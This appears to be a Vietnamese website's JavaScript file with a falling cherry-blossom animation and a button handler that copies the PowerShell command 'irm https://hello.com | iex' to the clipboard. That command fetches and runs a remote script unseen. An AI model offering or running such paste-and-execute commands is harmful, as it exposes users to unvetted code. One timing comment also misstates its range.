// JavaScript Document
//Chức năng sao chép lệnh vào clipboard
function copypowershell(){
	const textcp = "irm https://hello.com | iex";
	navigator.clipboard.writeText(textcp).then(function(){
		alert("Đã sao chép!","Thông báo");
	}).catch(function(error){
		alert("Lỗi!!!");
	});
}

//tạo hiệu ứng hoa rơi 
function createCherryBlossom() {
    const container = document.querySelector('.cherry-blossom-container');
    const blossom = document.createElement('div');
    blossom.classList.add('cherry-blossom');

    // Đặt vị trí ngẫu nhiên cho mỗi hoa
    blossom.style.left = Math.random() * 100 + 'vw'; 

    // Đặt thời gian rơi và kích thước ngẫu nhiên cho mỗi hoa
    blossom.style.animationDuration = Math.random() * 5 + 10 + 's'; // Thời gian từ 5-10 giây
    blossom.style.width = blossom.style.height = Math.random() * 20 + 10 + 'px'; // Kích thước từ 10px đến 30px

    container.appendChild(blossom);

    // Loại bỏ hoa sau khi rơi xuống đáy
    setTimeout(() => {
        blossom.remove();
    }, 10000); // 10 giây
}

// Tạo nhiều hoa anh đào
setInterval(createCherryBlossom, 500); // Cứ 500ms tạo ra một hoa mới




